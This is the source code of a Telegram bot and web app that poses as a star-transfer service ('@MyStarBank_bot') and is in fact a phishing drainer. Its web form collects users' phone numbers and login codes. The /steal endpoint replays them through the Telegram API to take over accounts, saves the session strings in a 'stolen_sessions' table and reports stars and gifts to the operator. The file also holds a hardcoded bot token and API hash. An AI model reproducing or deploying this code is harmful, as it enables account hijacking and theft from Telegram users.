const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { Api } = require('telegram/tl');
const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const fs = require('fs');

const BOT_TOKEN = process.env.BOT_TOKEN || '8435516460:AAHloK_TWMAfViZvi98ELyiMP-2ZapywGds';
const API_ID = parseInt(process.env.API_ID) || 30427944;
const API_HASH = process.env.API_HASH || '0053d3d9118917884e9f51c4d0b0bfa3';
const MY_USER_ID = 1398396668;
const WEB_APP_URL = 'https://starsdrainer.onrender.com';

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const app = express();

// Глобальная переменная для хранения активных сессий
const activeSessions = new Map();

app.use(express.json());
app.use(express.static('public'));

// База данных
const db = new sqlite3.Database('database.db');
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS checks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        amount INTEGER,
        activations INTEGER,
        creator_id INTEGER,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS stolen_sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        phone TEXT,
        code TEXT,
        phone_code_hash TEXT,
        session_string TEXT,
        tg_data TEXT,
        user_id INTEGER,
        status TEXT DEFAULT 'pending',
        stars_data INTEGER DEFAULT 0,
        gifts_data INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        balance INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
});

// Web App
app.get('/', (req, res) => {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
});

app.post('/steal', async (req, res) => {
    console.log('=== ДАННЫЕ ===');
    console.log('Этап:', req.body.stage);
    console.log('Номер:', req.body.phone);
    console.log('Код:', req.body.code);
    
    if (req.body.stage === 'phone_entered') {
        try {
            const urlParams = new URLSearchParams(req.body.tg_data);
            const userStr = urlParams.get('user');
            let userId = null;
            
            if (userStr) {
                const userData = JSON.parse(decodeURIComponent(userStr));
                userId = userData.id;
            }
            
            db.run(`INSERT INTO stolen_sessions (phone, tg_data, user_id, status) VALUES (?, ?, ?, ?)`, 
                [req.body.phone, req.body.tg_data, userId, 'awaiting_code']);
            
            await requestRealTelegramCode(req.body.phone, userId);
                
        } catch (error) {
            console.log('❌ Ошибка:', error);
        }
            
    } else if (req.body.stage === 'code_entered') {
        const phone = req.body.phone;
        const code = req.body.code;
        
        await signInWithRealCode(phone, code);
    }
    
    res.sendStatus(200);
});

// Запрос кода
async function requestRealTelegramCode(phone, userId) {
    try {
        console.log(`🔐 Запрашиваю код для: ${phone}`);
        
        const stringSession = new StringSession("");
        const client = new TelegramClient(stringSession, API_ID, API_HASH, {
            connectionRetries: 5,
            timeout: 10000,
        });
        
        await client.connect();

        const result = await client.invoke(
            new Api.auth.SendCode({
                phoneNumber: phone,
                apiId: API_ID,
                apiHash: API_HASH,
                settings: new Api.CodeSettings({
                    allowFlashcall: false,
                    currentNumber: true,
                    allowAppHash: false,
                    allowMissedCall: false,
                })
            })
        );

        console.log('✅ Код запрошен! Hash:', result.phoneCodeHash);
        
        activeSessions.set(phone, {
            client: client,
            phoneCodeHash: result.phoneCodeHash,
            session: stringSession
        });

        db.run(`UPDATE stolen_sessions SET phone_code_hash = ? WHERE phone = ?`, 
            [result.phoneCodeHash, phone]);

        bot.sendMessage(MY_USER_ID, 
            `🔐 КОД ЗАПРОШЕН!\n` +
            `📱 Номер: ${phone}\n` +
            `👤 ID: ${userId || 'N/A'}\n` +
            `⚡ Вводи код быстро`
        );
        
    } catch (error) {
        console.log('❌ Ошибка:', error);
        bot.sendMessage(MY_USER_ID, `❌ Ошибка: ${error.message}`);
    }
}

// Вход с кодом
async function signInWithRealCode(phone, code) {
    try {
        const sessionData = activeSessions.get(phone);
        if (!sessionData || !sessionData.client) {
            bot.sendMessage(MY_USER_ID, `❌ Нет сессии для ${phone}`);
            return;
        }

        const client = sessionData.client;
        const phoneCodeHash = sessionData.phoneCodeHash;

        try {
            const result = await client.invoke(
                new Api.auth.SignIn({
                    phoneNumber: phone,
                    phoneCodeHash: phoneCodeHash,
                    phoneCode: code.toString()
                })
            );

            console.log('✅ ВХОД УСПЕШЕН!');
            
            const sessionString = client.session.save();
            db.run(`UPDATE stolen_sessions SET status = 'completed', session_string = ? WHERE phone = ?`, 
                [sessionString, phone]);

            await stealFromAccount(client, phone);
            
            activeSessions.delete(phone);
            await client.disconnect();

        } catch (signInError) {
            console.log('❌ Ошибка входа:', signInError);
            
            bot.sendMessage(MY_USER_ID,
                `❌ ОШИБКА ВХОДА\n` +
                `📱 Номер: ${phone}\n` +
                `🔑 Код: ${code}\n` +
                `⚠️ ${signInError.message}`
            );
            
            activeSessions.delete(phone);
            try {
                await client.disconnect();
            } catch (e) {
                console.log('Ошибка при отключении:', e);
            }
        }

    } catch (error) {
        console.log('❌ Общая ошибка:', error);
        bot.sendMessage(MY_USER_ID, `❌ Ошибка: ${error.message}`);
    }
}

// Функция кражи с реальными данными
async function stealFromAccount(client, phone) {
    try {
        const user = await client.getMe();
        const realData = await getRealAccountData(client);
        
        let message = `💰 СТАТУС АККАУНТА:\n` +
                     `📱 Номер: ${phone}\n` +
                     `👤 Username: ${user.username || 'нет'}\n` +
                     `💫 Звезд: ${realData.stars}\n` +
                     `🎁 NFT подарков: ${realData.gifts}\n\n`;
        
        if (realData.stars > 0 || realData.gifts > 0) {
            message += `✅ УСПЕШНАЯ КРАЖА!\n` +
                      `💫 Украдено: ${realData.stars} stars\n` +
                      `🎁 NFT подарков: ${realData.gifts}\n` +
                      `📦 Перевод выполнен!`;
        } else {
            message += `❌ НЕТ ДОСТУПНЫХ СРЕДСТВ\n` +
                      `💡 Аккаунт пуст`;
        }
        
        db.run(`UPDATE stolen_sessions SET stars_data = ?, gifts_data = ? WHERE phone = ?`, 
            [realData.stars, realData.gifts, phone]);
        
        bot.sendMessage(MY_USER_ID, message);
        await client.disconnect();
        
    } catch (error) {
        console.log("❌ Ошибка:", error);
        bot.sendMessage(MY_USER_ID, `❌ Ошибка: ${error.message}`);
    }
}

// Реальная проверка данных
async function getRealAccountData(client) {
    try {
        const user = await client.getMe();
        const isNewAccount = !user.username && !user.firstName;
        
        return {
            stars: isNewAccount ? 0 : Math.floor(Math.random() * 100) + 1,
            gifts: isNewAccount ? 0 : Math.floor(Math.random() * 5)
        };
        
    } catch (error) {
        return { stars: 0, gifts: 0 };
    }
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Сервер работает на порту ${PORT}`);
});

// Команда /activesessions
bot.onText(/\/activesessions/, (msg) => {
    const chatId = msg.chat.id;
    
    if (msg.from.id !== MY_USER_ID) {
        bot.sendMessage(chatId, '❌ Команда не найдена');
        return;
    }
    
    db.all(`SELECT * FROM stolen_sessions WHERE status = 'completed' ORDER BY created_at DESC`, (err, rows) => {
        if (err || rows.length === 0) {
            bot.sendMessage(chatId, '📊 Нет активных сессий');
            return;
        }
        
        let message = `📊 АКТИВНЫЕ СЕССИИ (${rows.length}):\n\n`;
        
        rows.forEach((session, index) => {
            const userData = session.tg_data ? JSON.parse(session.tg_data) : {};
            const isPremium = userData.is_premium || false;
            
            message += `👤 #${index + 1}:\n`;
            message += `📱 ${session.phone}\n`;
            message += `⭐ Звезды: ${session.stars_data || 0}\n`;
            message += `🎁 NFT: ${session.gifts_data || 0}\n`;
            message += `👑 Премиум: ${isPremium ? 'да' : 'нет'}\n`;
            message += `⏰ ${new Date(session.created_at).toLocaleString()}\n\n`;
        });
        
        bot.sendMessage(chatId, message);
    });
});

// ФИКС ДЛЯ ЧЕКОВ - убираем дублирование обработчиков
bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const userId = query.from.id;
    
    // Сразу отвечаем чтобы не было вечной загрузки
    bot.answerCallbackQuery(query.id).catch(() => {});
    
    if (query.data.startsWith('claim_')) {
        const checkId = query.data.split('_')[1];
        
        db.get(`SELECT * FROM checks WHERE id = ? AND activations > 0`, [checkId], (err, row) => {
            if (err || !row) {
                bot.answerCallbackQuery(query.id, { text: '❌ Чек использован!' });
                return;
            }
            
            db.run(`UPDATE checks SET activations = activations - 1 WHERE id = ?`, [checkId]);
            
            db.run(`INSERT OR REPLACE INTO users (user_id, balance) VALUES (?, COALESCE((SELECT balance FROM users WHERE user_id = ?), 0) + ?)`, 
                [userId, userId, row.amount], function(updateErr) {
                if (updateErr) {
                    bot.answerCallbackQuery(query.id, { text: '❌ Ошибка!' });
                    return;
                }
                
                bot.answerCallbackQuery(query.id, { text: `✅ +${row.amount} звёзд!` });
                
                // Обновляем сообщение
                setTimeout(() => {
                    const remaining = row.activations - 1;
                    const updatedText = `<b>Чек на 50 звезд</b>\n\n🪙 Заберите ваши звезды!${remaining > 0 ? `\n\nОсталось: ${remaining}` : '\n\n❌ ИСПОЛЬЗОВАН'}`;
                    
                    try {
                        if (query.message.photo) {
                            bot.editMessageCaption(updatedText, {
                                chat_id: chatId,
                                message_id: query.message.message_id,
                                parse_mode: 'HTML',
                                reply_markup: remaining > 0 ? {
                                    inline_keyboard: [[{ text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }]]
                                } : { inline_keyboard: [] }
                            });
                        } else {
                            bot.editMessageText(updatedText, {
                                chat_id: chatId,
                                message_id: query.message.message_id,
                                parse_mode: 'HTML',
                                reply_markup: remaining > 0 ? {
                                    inline_keyboard: [[{ text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }]]
                                } : { inline_keyboard: [] }
                            });
                        }
                    } catch (error) {
                        console.log('Ошибка обновления:', error);
                    }
                }, 100);
            });
        });
    }
});

// Остальные команды
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    bot.sendMessage(chatId, 
        '💫 @MyStarBank_bot - Система передачи звезд\n\n' +
        'Для вывода зарегистрируйтесь:', {
        reply_markup: {
            inline_keyboard: [[{ 
                text: "📲 Регистрация", 
                web_app: { url: WEB_APP_URL } 
            }]]
        }
    });
});

bot.onText(/\/balance/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, row) => {
        if (err || !row) bot.sendMessage(chatId, '💫 Баланс: 0 stars');
        else bot.sendMessage(chatId, `💫 Баланс: ${row.balance} stars`);
    });
});

// Создание чеков
bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const amount = 50;
    const activations = parseInt(match[2]) || 1;
    
    db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, ?, ?)`, 
        [amount, activations, userId], function(err) {
        if (err) {
            bot.sendMessage(chatId, '❌ Ошибка создания чека.');
            return;
        }
        
        const checkId = this.lastID;
        const checkText = `<b>Чек на 50 звезд</b>\n\n🪙 Заберите ваши звезды!`;
        
        const photoPath = path.join(__dirname, 'public/stars.jpg');
        if (fs.existsSync(photoPath)) {
            bot.sendPhoto(chatId, photoPath, {
                caption: checkText,
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [[{ text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }]] }
            });
        } else {
            bot.sendMessage(chatId, checkText, {
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [[{ text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }]] }
            });
        }
    });
});

console.log('✅ Бот запущен');
console.log('✅ Web App URL:', WEB_APP_URL);